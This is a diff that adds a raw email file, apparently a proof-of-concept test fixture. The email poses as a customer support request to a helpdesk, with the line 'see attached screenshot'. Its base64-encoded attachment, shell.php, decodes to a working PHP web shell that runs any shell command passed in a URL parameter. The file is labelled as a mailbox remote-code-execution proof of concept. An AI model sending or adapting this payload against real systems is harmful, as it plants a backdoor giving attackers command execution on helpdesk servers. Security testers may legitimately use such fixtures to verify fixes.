@@ -1,0 +1,23 @@
+From: attacker@evil.example
+To: support@victim-helpdesk.example
+Subject: Help please
+Date: Wed, 12 Aug 2026 10:00:00 +0000
+Message-ID: <poc-1@evil.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="apex-poc-boundary"
+
+--apex-poc-boundary
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: 7bit
+
+My issue is not resolved, see attached screenshot.
+
+--apex-poc-boundary
+Content-Type: application/octet-stream; name="shell.php"
+Content-Disposition: attachment; filename="shell.php"
+Content-Transfer-Encoding: base64
+
+PD9waHAgZWNobyAnQVBFWC1VVkRFU0stTUFJTEJPWC1SQ0UtUE9DOicgLiBzaGVsbF9leGVjKCRf
+R0VUWydjJ10gPz8gJ2lkJyk7ID8+Cg==
+
+--apex-poc-boundary--
